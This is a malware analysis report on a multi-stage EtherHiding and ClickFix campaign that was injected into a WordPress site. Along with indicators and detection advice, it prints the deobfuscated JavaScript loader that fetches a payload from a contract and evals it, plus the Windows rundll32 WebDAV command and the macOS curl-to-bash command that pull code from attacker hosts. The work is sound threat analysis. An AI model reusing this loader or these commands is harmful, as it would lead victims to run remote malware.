# Analysis report — EtherHiding + ClickFix sample

- **Analyst tool:** reaper
- **Date:** 2026-05-14
- **Sample family:** EtherHiding-staged ClickFix campaign
- **Targeting:** Windows and macOS browser users on compromised WordPress sites
- **Companion files:** `README.md` (walkthrough), `SHA256SUMS` (artifact integrity), `artifacts/` (every payload referenced below)

## 1. Sample identification

| Artifact | Path | Size | SHA-256 |
|---|---|---|---|
| Original DOM dump (victim site) | `examples/dom01/019e26b4-5468-74d6-bf49-ebabb5dba0f0-dom.html` | 66 893 B | `4583b5d0887271456186e3b5f44a8be14f1965b32910a4cac94b832629eb3d58` |
| Minimal fixture (data URI + tiny HTML shell) | `examples/etherhiding/sample.html` | 5 458 B | `f72c199d2311936242a6e94d716f07504d795ed15a078917225b51a3566c5460` |
| Stage-1 carrier (base64 from data URI) | `artifacts/stage1/payload.b64` | 5 068 B | `1b4ac0a739d132a24d9a2eddfd58db43d2c0758ffafc59263c18c5ce63e2b696` |
| Stage-1 decoded (obfuscated JS) | `artifacts/stage1/payload.js` | 3 799 B | `8e9df00a2f2a062428a6a8347a7210bdcb3b3683fbb5c1f462acf53d8c028be3` |
| Stage-1 rewritten plaintext loader | `artifacts/stage1/payload.deobf.js` | 1 875 B | `45d38c46b777971072af1fc266d5a07d1b5cd76355275823a783ac9f3bc3956b` |
| Stage-2 dispatcher (decoded) | `artifacts/stage2/dispatcher.js` | 1 947 B | `5f601e12635891c244a77dd045ed917114ec1496c47ecce673a41346f3ec9971` |
| Stage-3 Windows outer | `artifacts/stage3-windows/outer.js` | 42 768 B | `8f41492633009b4b444bf01ead0367c98e1b770178f81087f94160679eb9c2ed` |
| Stage-3 Windows inner (rewritten) | `artifacts/stage3-windows/inner.deobf.js` | 10 241 B | `50446779954b3cd0786c58d7cdfd82a7e5070ff01cf96f10f65bfa97e1637281` |
| Stage-3 macOS outer | `artifacts/stage3-mac/outer.js` | 42 482 B | `0b7d6f2629891ccb6f207f8842bd2881c5aa6611ddc915fda1b15aa3b7a2529c` |
| Stage-3 macOS inner (rewritten) | `artifacts/stage3-mac/inner.deobf.js` | 10 292 B | `6416b92bf99e0184cc9340b68e38a7b80692149d61d1c3e28a09f3417633e296` |

The original DOM dump was captured from `klarrtransportservices.com`, a WordPress + Elementor site (Elementor 4.0.8, hello-elementor theme). The malicious payload sits among legitimate WordPress, jQuery, and Elementor `<script>` tags. Its placement next to first-party scripts suggests injection into a theme template, a plugin, or the WordPress database, rather than a one-off page compromise.

## 2. Executive summary

This sample is the **first stage of a multi-stage browser-side delivery chain** that ultimately uses the **ClickFix social-engineering pattern** to get the victim to run native commands on their own machine. The browser-side stages are delivered using the **EtherHiding** technique: each successive stage is read from storage on the BNB Smart Chain testnet, so there is no fixed JavaScript C2 hostname to block and each fetch is indistinguishable from any other public-RPC traffic.

The final native command differs per operating system:

- **Windows victims** receive `cmd /c "" start rundll32.exe \\handout-voivo-desk-ship-link.wiki@ssl\${uuid__}\google.cl,#1 Z8NBHkQ3`. The Windows `\\host@ssl\path` notation is implicit WebDAV-over-HTTPS, so `rundll32` loads a DLL named `google.cl` straight off the attacker server.
- **macOS victims** receive `/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.sue-intentioned.digital/?ublib=${uuid__}')"; echo ""BotGuard: Answer the protector challenge. Ref: 73282`. A classic `curl | bash`, with a trailing `echo` that makes the terminal look like a benign captcha confirmation.
- **Linux and other platforms:** the dispatcher emits `console.log("stop watching us :)")` and exits.

The chain is delivered via four stages, all staged inside smart contracts on BNB Smart Chain testnet:

1. **Stage 1** — base64-encoded JavaScript inside a `<script src="data:text/javascript;base64,...">` data URI. Decoded payload is wrapped in obfuscator.io's string-array scheme.
2. **Stage 2** — dispatcher fetched from contract `0xA1decFB75C8C0CA28C10517ce56B710baf727d2e`. Performs anti-sandbox checks and routes by operating system.
3. **Stage 3** — OS-specific payload fetched from `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` (Windows) or `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` (macOS). Inflates a fake "BotGuard" captcha overlay and silently writes the stage-4 command to the victim's clipboard via `navigator.clipboard.writeText`.
4. **Stage 4** — the OS-specific native command above, executed by the victim themselves after being prompted by the overlay.

Reaper recovered the full plaintext of every JavaScript stage statically. The companion tool `scripts/fetch-evm-payload.mjs` performs the read against contract storage as a single `eth_call`; nothing in the analysis ever runs the malware.

### 2.1 Observed live rotation

The Windows DLL host **rotated mid-analysis** within a single session:

- First fetch: `master-voivo-system-shop-slink.wiki`
- Second fetch (about 15 minutes later): `handout-voivo-desk-ship-link.wiki`

Same naming scheme (`<word>-voivo-<word>-<word>-<word>.wiki`), same DLL name (`google.cl`), same argument (`Z8NBHkQ3`). This is direct evidence that the operator mutates contract state to rotate infrastructure without redeploying anything to the compromised victim sites. The committed `artifacts/stage3-windows/clipboard-payload.txt` is the second observation; the first is preserved here for reference.

## 3. Attack chain, stage by stage

### 3.1 Stage 1 — base64 carrier in a `data:` URI

The compromised WordPress page emits a single `<script>` tag of the form:

```html
<script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4MThlNyhfMHgxZjVkZWEs..."></script>
```

5 068 base64 characters → 3 799 bytes of JavaScript. This is the bulk of the evasion: a content scanner looking for `eval`, `fetch`, or hex strings sees only opaque base64 in a `src=` attribute. `data:` URIs are commonly used for fonts, CSS, and small images, so the surface form is not anomalous.

### 3.2 Stage 1 (continued) — obfuscator.io string-array layer

The decoded JavaScript matches obfuscator.io's default output exactly:

1. **String table.** A function `_0x45c2()` returns a const array of literal strings (`['5103618wDGwtz', 'json', 'then', ..., 'https://bsc-testnet-rpc.publicnode.com/', 'latest', ...]`).
2. **Root decoder.** A function `_0x18e7(a, b)` reassigns itself on first call to a closure returning `arr[a - 0x1da]`.
3. **IIFE shuffle.** A self-checking `while(!![])` loop `push`/`shift`s the array until a `parseInt(...)/0x?` sum equals a magic number (`0x7301b`). Until that hash matches, the array is in scrambled order. The shuffle is data-dependent on the array contents and the magic, so any tampering invalidates everything — this is a tamper check rather than real cryptography.
4. **Wrapper functions.** Small helpers such as `_0x56d43c(a, b) { return _0x18e7(b - -0x288, a); }` that multiply the number of decoder identifiers and hide the real index offset inside arithmetic. Wrappers may be nested inside the function that uses them, with hex-named const objects (such as `_0x4fcfdf._0x2781ea = 0x2dc`) acting as per-call-site lookup tables to disguise the actual integer arguments.

Reaper's `--rewrite` flag detects this entire pattern via `src/analyzers/stringarray.ts`:

- locates the array fn (a FunctionDeclaration whose body declares a large `ArrayExpression`)
- locates the root decoder (a FunctionDeclaration whose return statement is a `SequenceExpression` re-assigning itself to a FunctionExpression)
- locates the IIFE shuffle (a top-level `ExpressionStatement` calling a FunctionExpression with the array fn as an argument)
- boots all three in a sandboxed Node `vm`, which causes the array to settle in its final order with no need to reverse the magic number
- discovers every wrapper fn at any depth by repeatedly scanning for tiny `return knownDecoder(...)` shapes until no new wrappers are found
- for each wrapper, walks up the AST to collect enclosing-scope const objects and primitives, inlines them into a clone of the wrapper body, and emits that clone into the vm so a nested wrapper that referenced `_0x1cab6e._0x39fa20` from `load_`'s scope executes correctly outside `load_`
- walks the AST and replaces every wrapper call whose arguments are const-evaluable with a `StringLiteral` of the result
- strips the array fn, root decoder, IIFE, and every wrapper from the output

For the stage-1 loader, reaper resolved **28 of 28** wrapper call sites (100 %), unmasking all four wrappers. Plaintext output is 1 875 B versus 3 799 B in — roughly half the input was scaffolding. The rewritten file is `artifacts/stage1/payload.deobf.js`.

### 3.3 Stage 1 (continued) — what the loader actually does

The rewritten plaintext makes the intent obvious in about 20 lines:

```js
async function load_(_0x190308) {
  const _0x31d674 = bytes => {
    let s = '0x';
    for (const b of bytes) {
      const h = b.toString(0x10);
      s += h.length === 1 ? '0' + h : h;
    }
    return s;
  };
  const rpcCall = {
    method: 'eth_call',
    params: [{ to: _0x190308, data: '0x6d4ce63c' }, 'latest'],
    id: 0x61, jsonrpc: '2.0'
  };
  const httpOpts = {
    method: 'POST',
    headers: { Accept: 'application/json', 'Content-Type': 'application/json' },
    body: JSON.stringify(rpcCall)
  };
  const resp     = await fetch('https://bsc-testnet-rpc.publicnode.com/', httpOpts);
  const hexBody  = (await resp.json()).result.slice(0x2);
  const bytes    = new Uint8Array(hexBody.match(/[\da-f]{2}/gi).map(h => parseInt(h, 16)));
  const offset   = Number(_0x31d674(bytes.slice(0, 0x20)));
  const length   = Number(_0x31d674(bytes.slice(0x20, 0x20 + offset)));
  return String.fromCharCode.apply(null, bytes.slice(0x20 + offset, 0x20 + offset + length));
}

load_('0xA1decFB75C8C0CA28C10517ce56B710baf727d2e')
  .then(payload => eval(atob(payload)))
  .catch(() => {});
```

The function is a hand-rolled Solidity-ABI string decoder. For a single-`string` return value, the ABI lays out 32 bytes of offset (always `0x20`), 32 bytes of length, then the string content right-padded to 32. The decoded string is base64; the base64 decodes to JavaScript; that JavaScript is `eval`'d.

### 3.4 Stage 2 — the dispatcher

`load_('0xA1decFB75C8C0CA28C10517ce56B710baf727d2e')` reads from contract storage at function selector `0x6d4ce63c`. The returned bytes decode to JavaScript that, in turn, is the stage-2 dispatcher (`artifacts/stage2/dispatcher.js`).

The dispatcher does three things:

1. **Anti-sandbox.** `isHeadless()` returns true if at least two of these are true: `navigator.webdriver === true`, UA includes `HeadlessChrome` / `PhantomJS` / `Puppeteer` / `Playwright`, `window.outerWidth === 0 && window.outerHeight === 0`, missing `window.chrome` and `window.safari` while also not Firefox. It then ANDs with a "looks like a real browser" check (`navigator.plugins.length > 0` or `navigator.languages.length > 0`).
2. **Anti-analyst.** `isLocalhost()` bails out on `localhost`, `127.0.0.1`, `::1`, `*.localhost`, and any RFC1918 IP range.
3. **OS routing.** Inspects `navigator.userAgent`, `navigator.userAgentData?.platform`, and `navigator.platform`. Windows hosts call `load_('0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff')`. macOS hosts call `load_('0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5')`. Anything else logs `"stop watching us :)"` to the console and exits.

The dispatcher uses the same `load_` primitive as stage 1, so the read shape against the new contract is identical: same RPC endpoint, same selector, different `to` address.

### 3.5 Stage 3 — Windows branch

`artifacts/stage3-windows/outer.js` is the base64-decoded contract data. It is composed of:

- an `isHeadless()` block, identical in spirit to the dispatcher
- a base64 string that decodes to a Yandex Metrika analytics shim (account `99162160`), which is `eval`-injected for **victim tracking**
- a larger base64 string that decodes to another obfuscator.io string-array module — the actual stage-3 payload (`artifacts/stage3-windows/inner.js`)
- a final `document.querySelector("script[src*='base64,']").remove()` that deletes the stage-1 `<script>` tag from the live DOM after execution, hiding the loader from any post-hoc DOM inspection

Reaper rewrote the inner module (`artifacts/stage3-windows/inner.deobf.js`) with 159 of 167 wrapper calls resolved (95.2 %). The remaining 8 are wrappers whose arguments are passed in as function parameters or computed at runtime, which the current static rewriter cannot evaluate.

The deobfuscated inner module builds and styles a DOM overlay (`document.getElementById` references to four host elements with random-looking IDs such as `_igYf5z7r`, `_ES1T9OYV`, `_652fvqTR`, `_gEI3alEi`) and on a user-gesture event calls `navigator.clipboard.writeText` with the stage-4 string.

### 3.6 Stage 3 — macOS branch

Same shape as the Windows branch, slightly different sizes (`artifacts/stage3-mac/outer.js` is 42 482 B vs. 42 768 B for Windows; inner is 16 169 B vs. 15 795 B). Reaper resolved 149 of 155 wrapper calls (96.1 %) in the macOS inner. The overlay constructed is functionally identical; only the clipboard string differs.

### 3.7 Stage 4 — the clipboard payloads

The two `clipboard-payload.txt` files contain the strings the malware silently writes to the victim's clipboard. They are committed as plain text data files; running them is the entire point of the campaign, so they are deliberately not made executable.

**Windows** (`artifacts/stage3-windows/clipboard-payload.txt`):

```
cmd /c "" start rundll32.exe \\handout-voivo-desk-ship-link.wiki@ssl\${uuid__}\google.cl,#1 Z8NBHkQ3
```

Breakdown:

- `cmd /c ""` — opens cmd, immediately runs an empty inner command. This decoy defeats naive copy-paste filters that strip commands beginning with `cmd`, `powershell`, or `rundll32`.
- `start rundll32.exe ...` — `start` detaches the process so the cmd window can close cleanly.
- `\\handout-voivo-desk-ship-link.wiki@ssl\${uuid__}\google.cl` — Windows UNC syntax. The `@ssl` suffix makes Windows resolve this as **WebDAV over HTTPS**, not SMB. The `${uuid__}` is a placeholder filled in client-side from a per-victim UUIDv4 generated by stage 3, used by the C2 to identify and de-duplicate victims.
- `google.cl` — a Windows DLL with a `.cl` extension to disguise its file type.
- `,#1` — invoke export ordinal 1 of the DLL.
- `Z8NBHkQ3` — single string argument passed to the export. Probably an activation key, decryption key, or build-specific config selector.

The "living off the land" choice is deliberate: `rundll32.exe` is a signed Microsoft binary that is allowed by default, the network fetch happens inside Windows itself (not via a separate `curl` or `powershell` invocation), and the DLL never touches disk under a `.dll` extension that defenders index.

**macOS** (`artifacts/stage3-mac/clipboard-payload.txt`):

```
/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.sue-intentioned.digital/?ublib=${uuid__}')"; echo ""BotGuard: Answer the protector challenge. Ref: 73282
```

Breakdown:

- `bash -c "$(curl ... )"` — classic `curl | sh` pattern, command-substituted so bash sees the fetched body directly.
- `-A 'Mac OS X 10_15_7'` — User-Agent spoof so server-side filters do not block bare `curl/*` agents.
- `-fsSL` — fail on errors (`-f`), silent (`-s`), show errors (`-S`), follow redirects (`-L`). Standard `curl | bash` flags.
- `${usr_id}.sue-intentioned.digital` and `?ublib=${uuid__}` — per-victim subdomain placeholder (resolved by an earlier stage on the server side) plus a per-victim UUID query string. The subdomain pattern suggests at least some server-side knowledge of the victim before this stage runs.
- `; echo ""BotGuard: Answer the protector challenge. Ref: 73282` — visual deception. After the malicious curl completes, the terminal prints what looks like a captcha confirmation line, so the user believes their pasted command worked as advertised.

### 3.8 The "BotGuard" lure

Inside the stage-3 inner the analyst-facing label is built from the small base64 string `zpQgUtC1Zjo=`. Decoded as UTF-8 it is `Δ Rеf:`. The `е` is Cyrillic U+0435 (not Latin `e` U+0065), a typographic trick to evade simple keyword filters.

## 4. Behavioural confirmation (dynamic)

Reaper's docker sandbox runs the deobfuscated stage-1 loader inside a `--network none` container while installing a stub `fetch`/`http`/`https` responder. With the network blocked but the stub returning a synthetic empty success response, the loader proceeds past the network call far enough for the request itself to be logged:

```sh
./scripts/analyze.sh examples/etherhiding/artifacts/stage1/payload.deobf.js \
    --dynamic-only --observe-network --timeout 8
```

The relevant captured line:

```json
[REAPER] {"category":"fetch",
          "detail":{
            "url":    "https://bsc-testnet-rpc.publicnode.com/",
            "method": "POST",
            "body":   "{\"method\":\"eth_call\",
                       \"params\":[
                         {\"to\":\"0xA1decFB75C8C0CA28C10517ce56B710baf727d2e\",
                          \"data\":\"0x6d4ce63c\"},
                         \"latest\"
                       ],
                       \"id\":97,\"jsonrpc\":\"2.0\"}"
          }}
```

The stub returned `{"jsonrpc":"2.0","id":0,"result":"0x"}`. With an empty `result`, the loader's ABI decode produced an empty string, `eval(atob(""))` was a no-op, and the wall-clock timeout terminated the container. The important data point — that this loader contacts a public BSC testnet RPC at one specific contract and selector — was captured with no real egress and no second-stage code ever running.

To exercise the eval sink, the sandbox stub can be patched to return a chosen ABI-encoded payload, or `--block-eval` can be added so that any eval throws after logging the code it was about to execute.

## 5. Indicators

### 5.1 Browser-side staging

| Type | Value | Notes |
|---|---|---|
| Loader staging | `<script src="data:text/javascript;base64,...">` | Common form; not anomalous on its own |
| RPC endpoint | `https://bsc-testnet-rpc.publicnode.com/` | Public BSC testnet RPC; benign infrastructure abused as a relay |
| RPC method | `eth_call` with `"latest"` block tag | Read-only contract call. No on-chain trace, no gas, no signed transaction. |
| Function selector | `0x6d4ce63c` | Hardcoded into every stage. The same accessor selector on every contract. |
| Sink (every stage) | `eval(atob(<ABI-decoded payload>))` | Both base64 and ABI string decoding |
| Stage-2 dispatcher contract | `0xA1decFB75C8C0CA28C10517ce56B710baf727d2e` | Anti-sandbox + OS routing |
| Stage-3 Windows contract | `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` | Fake-captcha overlay + clipboard write |
| Stage-3 macOS contract | `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` | Fake-captcha overlay + clipboard write |
| Victim host | `klarrtransportservices.com` (WordPress + Elementor) | Compromised, likely via vulnerable plugin or stolen admin creds |

The three contract addresses are the strongest IOCs. The RPC endpoint, selector, ABI shape, and obfuscation pattern are all reusable across unrelated campaigns; the contract addresses are unique to this one until the operator rotates them.

### 5.2 Stage-4 native execution

| Type | Value | Notes |
|---|---|---|
| C2 (Windows DLL host) | `handout-voivo-desk-ship-link.wiki` | WebDAV over HTTPS; serves `google.cl` (renamed DLL). `.wiki` TLD is cheap and minimally vetted. |
| C2 (Windows DLL host, prior rotation) | `master-voivo-system-shop-slink.wiki` | Same fingerprint, observed earlier in the same analysis session. Operator has at least one prior name in rotation. |
| C2 (macOS script host) | `*.sue-intentioned.digital` | Per-victim subdomain populated server-side or by an earlier stage |
| Per-victim UUID query param | `?ublib=${uuid__}` | UUIDv4 generated client-side in stage 3 |
| User-Agent spoof | `Mac OS X 10_15_7` | Passed to `curl` via `-A` to avoid server-side UA filters |
| Visual lure | "BotGuard Δ Ref: \<UUID\>" overlay | Cyrillic `е` (U+0435) in "Ref" defeats naive keyword matches |

### 5.3 Domain naming pattern (probable family signature)

Both observed Windows hosts match the regex `[a-z]+-voivo-[a-z]+-[a-z]+-[a-z]+\.wiki`. This is a hand-picked or template-generated pattern, not a DGA — the second token (`voivo`) is fixed. Any other domain matching this template under `.wiki` should be treated as a likely C2 for the same operator.

## 6. Methodology — reaper features exercised

1. **HTML / data-URI ingestion** (`src/parser/html.ts`). Running `reaper examples/etherhiding/sample.html` automatically extracts the `data:text/javascript;base64,...` URI into a virtual sub-file. Every analyzer then operates on the decoded JavaScript.
2. **Default scan.** Surfaces the `eval()` and `atob()` calls in the decoded but still-obfuscated source.
3. **`--rewrite`** (`src/analyzers/stringarray.ts`). Full HTML → base64 → obfuscator.io-string-array static deobfuscation. Recovered 100 % of wrapper call sites on the loader (28/28), and 95 to 96 % on the larger stage-3 inner payloads.
4. **Dynamic sandbox with `--observe-network`** (`docker/runner.js`). Captures the exact JSON-RPC request the loader would issue, with no real egress and the real second stage never executed.
5. **`scripts/fetch-evm-payload.mjs`.** Reads each EVM-staged payload out of contract storage via `eth_call`, ABI-decodes the return value, and base64-decodes when the bytes look like base64-encoded JavaScript. Used out-of-band so that neither reaper nor the sandboxed runner ever touches the live infrastructure during static analysis.

## 7. Mitigations and detections

- **Content Security Policy (highest leverage).** A strict CSP that disallows `data:` URIs in `<script src=>` (for example `script-src 'self' https:`) prevents the data-URI smuggle entirely. This single header eliminates the carrier.
- **Network egress.** Any browser, EDR, or proxy that can match outbound JSON-RPC request payloads should treat `eth_call` requests whose `params[0].to` matches any of the three contract addresses listed in §5.1 as malicious. Hostname-only blocking of `bsc-testnet-rpc.publicnode.com` is reasonable in environments that do no Web3 work but produces false positives against legitimate dApps elsewhere.
- **DNS and HTTP egress.** Block `*.sue-intentioned.digital`, and any domain matching `[a-z]+-voivo-[a-z]+-[a-z]+-[a-z]+\.wiki`. Neither has any legitimate purpose.
- **Endpoint (Windows).** Alert on `rundll32.exe` invoked against any `\\*@ssl\*` UNC path. There is essentially no legitimate use of WebDAV-over-HTTPS as an executable code source. Useful EDR rule: parent process is `cmd.exe` or `explorer.exe`, child process is `rundll32.exe`, the command line contains `@ssl`. The presence of `cmd /c ""` as a leading no-op is itself anomalous.
- **Endpoint (macOS).** Alert on `bash -c "$(curl ...)"`, `curl | sh`, and `bash` reading from `/dev/stdin` with no script file. The `-A 'Mac OS X 10_15_7'` UA spoof is itself anomalous on a system that is not running curl from inside a browser process.
- **Clipboard hygiene.** Browsers grant `navigator.clipboard.writeText` after a user gesture. Some hardening extensions revoke this for unrecognised origins. This is a defense-in-depth, not a primary control.
- **Static content scanning.** Grep stored HTML and site backups for `<script src="data:text/javascript;base64,`. Almost no legitimate use of this pattern exists in WordPress or Elementor output.
- **Origin server.** Integrity check on the compromised host's WordPress core, plugins, themes, and database. Look for unexpected `<script>` insertions in `wp_posts`, `wp_options`, and active theme template files.

## 8. Limitations

- The **final native artefacts** (the DLL served at `\\handout-voivo-desk-ship-link.wiki@ssl\<uuid>\google.cl` and the shell script served from `sue-intentioned.digital`) were not retrieved. Doing so would require an actual WebDAV or `curl` request to live attacker infrastructure, adding the analyst's IP to the campaign's victim list and exposing the analyst host to the unknown native binary. Both reads are intentionally out of scope. Conclusions about the final capability (info-stealer, RAT, loader, ransomware) can therefore only be inferred from the delivery pattern.
- The original DOM was captured at an unknown timestamp; contract state has demonstrably rotated since (see §2.1). Hashes in §1 reflect the version returned at the time of analysis, frozen in `artifacts/`.
- The compromise vector on `klarrtransportservices.com` is not in scope.
- Only one function selector (`0x6d4ce63c`) was probed on each contract. Other selectors on the same contracts may serve additional payloads (analyst-specific decoys, kill switches, per-region variants). Enumerating common accessor selectors (`get()`, `getString()`, `payload()`, etc.) against each contract is left to follow-up work.
